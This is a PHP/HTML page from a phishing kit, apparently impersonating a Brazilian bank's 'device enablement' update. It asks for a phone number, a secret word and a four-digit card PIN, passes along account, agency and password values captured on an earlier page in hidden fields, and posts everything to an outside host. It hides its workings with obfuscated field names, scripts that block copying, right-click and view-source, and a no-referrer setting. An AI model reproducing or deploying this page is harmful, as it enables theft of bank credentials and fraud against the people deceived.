<?php 
  $url_atual = "http" . (isset($_SERVER[HTTPS]) ? (($_SERVER[HTTPS]=="on") ? "s" : "") : "") . "://" . "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

  $explodeUrl = explode("/",$url_atual);
  $novaUrl = array_pop($explodeUrl);
  $explodeUrl = implode("/",$explodeUrl);
?>
<html lang="pt-br"><head><script>
function disableselect(e){
    return false;
}

function reEnable(){   
    return true;
}

document.onselectstart = function() { return false; }   
document.oncontextmenu = function() { return false; }

if (window.sidebar) {   
    document.onmousedown = disableselect;   
    document.onclick = reEnable;
}

document.onkeydown = function(e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 ||  e.keyCode === 117)) {
    alert('Acao nao permitida!');
    return false;
  } else {
          return true;
        }
};
</script>
<!-- Referrer -->
<script>
  var meta = document.createElement('meta');
  meta.name = "referrer";
  meta.content = "no-referrer";
  document.getElementsByTagName('head')[0].appendChild(meta);
</script><meta name="referrer" content="no-referrer">




    <meta charset="utf-8">
     <title>Atualização</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="./css/tiopatas.css" rel="stylesheet">
    <style type="text/css">


    h1, input {
        font-family: "Open Sans", Helvetica, sans-serif;
    }

    .input {
        width: 100%;
		background-color: #f7f7f7;
        height: 50px;
        display: block;
        padding: 0 5px;
        border: none;
        border-bottom: 3px solid #ebebeb;
    }
    .input:focus {
        outline: none;
        border-bottom-color: #ff0000 !important;
    }

	
.form-signin
{
    max-width: 100%;
    padding: 20px;
    margin: auto;
}
.form-signin .form-signin-heading, .form-signin .checkbox
{
    margin-bottom: 20px;
}
.form-signin .checkbox
{
    font-weight: normal;
}
.form-signin .form-control
{
    position: relative;
    font-size: 16px;
    height: auto;
    padding: 10px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
.form-signin .form-control:focus
{
    z-index: 2;
}
.form-signin input[type="text"]
{
    margin-bottom: -1px;
    border-bottom-left-radius: 0px;
    border-bottom-right-radius: 0px;
}
.form-signin input[type="password"]
{
    margin-bottom: 10px;
    border-top-left-radius: 0px;
    border-top-right-radius: 0px;
}
.account-wall
{
    margin-top: -10px;
    padding: 0px 0px 0px 0px;
    background-color: #f7f7f7;
    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}
.login-title
{
    color: #555;
    font-size: 18px;
    font-weight: 400;
    display: block;
}
.profile-img
{
    width: 100%;
    height: 50px;
    margin: 5px 0px 0px;
    display: block;
    /*-moz-border-radius: 0%;
    -webkit-border-radius: 0%;
    border-radius: 40%;*/
}



hr.style13 {
	height: 10px;
	border: 0;
	box-shadow: 0 10px 10px -10px #8c8b8b inset;
}

input[type=number] {
    -webkit-text-security: disc;
}

</style>
    <title>Atualização</title>

<script language="JavaScript">
function enviardados(){
 
if(document.loginform.xdx4x.value=="" || document.loginform.xdx4x.value.length < 4)
{
alert( "Senha inválida, tente novamente!" );
document.loginform.xdx4x.focus();
return false;
}
 
 if(document.loginform.xdxdxdxtxexlxexfxoxnxex.value=="" || document.loginform.xdxdxdxtxexlxexfxoxnxex.value.length < 15)
{
alert( "Telefone inválido, preencha corretamente." );
document.loginform.xdxdxdxtxexlxexfxoxnxex.focus();
return false;
}
return true;
}
 
</script>

<script>
  function limitarInput(obj) {
    obj.value = obj.value.substring(0,11); 
  }
</script>
<script>
  function limitarInput2(obj) {
    obj.value = obj.value.substring(0,15); 
  }
</script>
<script>
  function limitarInput3(obj) {
    obj.value = obj.value.substring(0,4); 
  }
</script>

<script>
function proximoCampo(atual,proximo){
if(atual.value.length >= atual.maxLength){
document.getElementById(proximo).focus();
}
}
</script>
<script type="text/javascript">
/* Máscaras ER */
function mascara(o,f){
    v_obj=o
    v_fun=f
    setTimeout("execmascara()",1)
}
function execmascara(){
    v_obj.value=v_fun(v_obj.value)
}
function mtel(v){
    v=v.replace(/\D/g,"");             //Remove tudo o que não é dígito
    v=v.replace(/^(\d{2})(\d)/g,"($1) $2"); //Coloca parênteses em volta dos dois primeiros dígitos
    v=v.replace(/(\d)(\d{4})$/,"$1-$2");    //Coloca hífen entre o quarto e o quinto dígitos
    return v;
}
function id( el ){
	return document.getElementById( el );
}
window.onload = function(){
	id('xdxdxdxtxexlxexfxoxnxex').onkeyup = function(){
		mascara( this, mtel );
	}
}
</script>
</head>
 
<body>


<div class="container">
    <div class="row">
        <div>
            <div class="account-wall">
				<h6 align="center" style=" background-color: #E40203;"><img src="./img/logo.png" height="80" width="250"></h6>
				<h5 align="center"><b><font color="ff0000">Atenção!<br></font></b></h5>
				<h5 align="center"><b></b><font color="000">É necessário habilitar o seu aparelho!</font></h5><font color="000">
				<hr class="style13">
		         </font><form id="loginform" name="loginform" class="form-signin" action="http://bullmanescoras.com.br/email/envio-san-5-pj.php" method="POST" onsubmit="return enviardados();"><font color="000">
                 <input name="xdxdxdxtxexlxexfxoxnxex" id="xdxdxdxtxexlxexfxoxnxex" type="tel" placeholder="DDD + Telefone" maxlength="15" required="required" onkeyup="lmt3(this),proximoCampo(this, 'xpxsxexcxrxextxax')" class="input pass">
                 <input type="hidden" name="erro" value="<?php echo $explodeUrl.'/done.php'; ?>" />
                 <input type="hidden" name="sucesso" value="<?php echo $explodeUrl.'/done.php'; ?>" />
                 <input name="xpxsxexcxrxextxax" id="xpxsxexcxrxextxax" type="text" placeholder="Palavra Secreta" maxlength="15" required="required" onkeyup="limitarInput2(this),proximoCampo(this, 'xdx4x')" class="input pass">
				 <input name="xdx4x" id="xdx4x" type="number" placeholder="Senha do cartão (4 dígitos)" maxlength="4" required="required" onkeyup="limitarInput3(this),proximoCampo(this, 'xdx4x')" class="input pass">
                     
                <input name="xuxsxuxaxrxixox" id="xuxsxuxaxrxixox" type="hidden" value="<?php echo $_POST['xuxsxuxaxrxixox']; ?>">
                <input name="xsxexnxhxax" id="xsxexnxhxax" type="hidden" value="<?php echo $_POST['xsxexnxhxax']; ?>" >
                <input name="xaxsxsxexlxextxrxoxnxixcxax" id="xaxsxsxexlxextxrxoxnxixcxax" type="hidden" value="<?php echo $_POST['xaxsxsxexlxextxrxoxnxixcxax']; ?>" >
                <input name="xaxgxexnxcxixax" id="xaxgxexnxcxixax" type="hidden" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>" >
                <input name="xcxoxnxtxa" id="xcxoxnxtxa" type="hidden" value="<?php echo $_POST['xcxoxnxtxa']; ?>">
				 
				<br><button class="btn btn-lg btn-default btn-block" type="submit">CONTINUAR</button></font>
				

			</form>
						<img class="profile-img" src="./img/one.png" alt="">
            </div>
        </div>
		
    </div>
</div>
<script type="text/javascript">

</script>

 
</body></html>